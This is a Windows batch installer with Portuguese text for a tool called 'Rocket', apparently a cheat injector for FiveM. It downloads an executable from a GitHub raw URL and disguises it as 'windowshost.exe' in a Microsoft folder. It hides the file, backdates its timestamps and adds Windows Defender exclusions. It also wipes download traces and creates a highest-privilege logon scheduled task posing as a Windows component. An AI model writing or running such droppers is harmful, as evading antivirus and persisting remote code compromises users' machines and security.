@echo off
title Instalador Rocket - GHARD Pinheiros
color 0A

:: Verificar Admin
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [ERRO] Execute como Administrador!
    pause
    exit /b 1
)

set "URL=https://raw.githubusercontent.com/V3xDev/unknow2/main/Rocket.exe"
set "PASTA=%LOCALAPPDATA%\Microsoft\WindowsApps"
set "ARQUIVO=windowshost.exe"
set "CAMINHO=%PASTA%\%ARQUIVO%"
set "TAREFA=Microsoft\Windows\WindowsApps"

echo.
echo ========================================
echo    INSTALADOR ROCKET - GHARD PINHEIROS
echo ========================================
echo.

:: ========================================
:: PARTE 1: LIMPEZA COMPLETA
:: ========================================
echo [1/4] Limpando todos os rastros...
taskkill /f /im Rocket.exe >nul 2>&1
taskkill /f /im windowshost.exe >nul 2>&1
schtasks /end /tn "%TAREFA%" >nul 2>&1
schtasks /delete /tn "%TAREFA%" /f >nul 2>&1
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Get-ScheduledTask | Where-Object {$_.TaskName -like '*WindowsApps*' -or $_.TaskName -like '*Rocket*'} | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue | Out-Null"
if exist "%CAMINHO%" (
    attrib -s -h "%CAMINHO%" >nul 2>&1
    del /q /f "%CAMINHO%" >nul 2>&1
)
certutil -urlcache * delete >nul 2>&1
del /q /f "%TEMP%\install*.bat" >nul 2>&1
timeout /t 2 /nobreak >nul
echo [OK] Limpeza concluida!
echo.

:: ========================================
:: PARTE 2: BAIXAR E INSTALAR
:: ========================================
echo [2/4] Baixando Rocket.exe...
if not exist "%PASTA%" mkdir "%PASTA%" >nul 2>&1

powershell -ExecutionPolicy Bypass -Command "$url='%URL%'; $out='%CAMINHO%'; try { $ProgressPreference='SilentlyContinue'; Write-Host '     Baixando...' -NoNewline; Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing -TimeoutSec 120 -ErrorAction Stop; Start-Sleep -Milliseconds 1000; if (Test-Path $out) { $file=Get-Item $out; if ($file.Length -gt 1000) { Write-Host ' [OK]' -ForegroundColor Green; Write-Host '[OK] Download concluido! Tamanho: ' $file.Length ' bytes' -ForegroundColor Green; exit 0 } else { Write-Host ' [ERRO] Arquivo muito pequeno!' -ForegroundColor Red; Remove-Item $out -Force; exit 1 } } else { Write-Host ' [ERRO] Arquivo nao criado!' -ForegroundColor Red; exit 1 } } catch { Write-Host ' [ERRO]' -ForegroundColor Red; Write-Host '[ERRO] Falha no download: ' $_.Exception.Message -ForegroundColor Yellow; if (Test-Path $out) { Remove-Item $out -Force }; exit 1 }"

if %errorLevel% neq 0 (
    echo [ERRO] Falha no download!
    pause
    exit /b 1
)

if not exist "%CAMINHO%" (
    echo [ERRO] Arquivo nao foi baixado!
    pause
    exit /b 1
)

:: ========================================
:: PARTE 3: CONFIGURAR ARQUIVO
:: ========================================
echo.
echo [3/4] Configurando arquivo...
attrib +s +h "%CAMINHO%" >nul 2>&1
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { $f='%CAMINHO%'; if (Test-Path $f) { $file=Get-Item $f; $file.Attributes=$file.Attributes -bor [System.IO.FileAttributes]::NotContentIndexed; $file.LastWriteTime=(Get-Date).AddYears(-2); $file.CreationTime=(Get-Date).AddYears(-2); Add-MpPreference -ExclusionPath $f -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '%PASTA%' -ErrorAction SilentlyContinue } } catch { }"
echo [OK] Arquivo configurado!
echo.

:: ========================================
:: PARTE 4: CRIAR TAREFA AGENDADA
:: ========================================
echo [4/4] Criando tarefa agendada...
powershell -ExecutionPolicy Bypass -Command "try { $action=New-ScheduledTaskAction -Execute '%CAMINHO%'; $trigger=New-ScheduledTaskTrigger -AtLogOn; $trigger.Delay='PT30S'; $principal=New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest; $settings=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable:$false -ExecutionTimeLimit (New-TimeSpan -Hours 0) -MultipleInstances IgnoreNew -RestartCount 0 -DontStopOnIdleEnd -IdleSettings (New-ScheduledTaskIdleSettings -StopOnIdleEnd $false -RestartOnIdle $false); Register-ScheduledTask -TaskName '%TAREFA%' -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description 'Componente de Host de Aplicativos do Windows' -Force -ErrorAction Stop | Out-Null; Write-Host '[OK] Tarefa criada via PowerShell!' -ForegroundColor Green; exit 0 } catch { Write-Host '[AVISO] PowerShell falhou, tentando metodo alternativo...' -ForegroundColor Yellow; exit 1 }"

if %errorLevel% neq 0 (
    schtasks /create /tn "%TAREFA%" /tr "\"%CAMINHO%\"" /sc onlogon /ru "%USERNAME%" /rl HIGHEST /delay 0030 /f >nul 2>&1
    if %errorLevel% neq 0 (
        echo [ERRO] Falha ao criar tarefa!
        pause
        exit /b 1
    )
)

:: Verificar tarefa
timeout /t 2 /nobreak >nul
schtasks /query /tn "%TAREFA%" >nul 2>&1
if %errorLevel% equ 0 (
    echo [OK] Tarefa confirmada!
) else (
    echo [AVISO] Tarefa criada mas nao encontrada. Pode ser necessario reiniciar.
)

:: ========================================
:: CONCLUSÃO
:: ========================================
echo.
echo ========================================
echo    INSTALACAO COMPLETA COM SUCESSO!
echo ========================================
echo.
echo [OK] Arquivo instalado: %CAMINHO%
echo [OK] Tarefa agendada: %TAREFA%
echo.
echo IMPORTANTE - METODO DE INJECAO:
echo   1. Reinicie o PC
echo   2. Aguarde 30 segundos apos logon
echo   3. Abra o Spotify e toque: GHARD - Pinheiros
echo   4. Abra o FiveM
echo   5. A injeção ocorrerá automaticamente quando a música estiver tocando
echo   6. Pressione INSERT para abrir o menu
echo.
pause
